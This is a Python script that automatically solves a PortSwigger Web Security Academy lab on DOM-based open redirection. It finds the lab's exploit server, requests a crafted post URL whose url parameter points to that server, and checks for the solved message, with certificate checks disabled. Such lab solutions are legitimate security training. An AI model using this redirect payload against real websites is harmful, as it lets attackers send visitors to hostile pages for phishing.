#!/usr/bin/env python3
# DOM-based open redirection
# Lab-Link: https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_exploitserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    try:
        result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    except TypeError:
        return None
    return result


def main():
    print('[+] DOM-based open redirection')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        exploit_server = find_exploitserver(client.get(host).text)
        if exploit_server is None:
            print(f'[-] Failed to find exploit server')
            sys.exit(-2)
        print(f'[+] Exploit server: {exploit_server}')

        link = f'{host}/post?postId=5&url={exploit_server}'
        if client.get(link).status_code != 200:
            print(f'[-] Malicious link does not result in correct response status')
            print(f'[-] Link used: {link}')
            sys.exit(-4)
        print(f'[+] Malicious link called: {link}')

        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
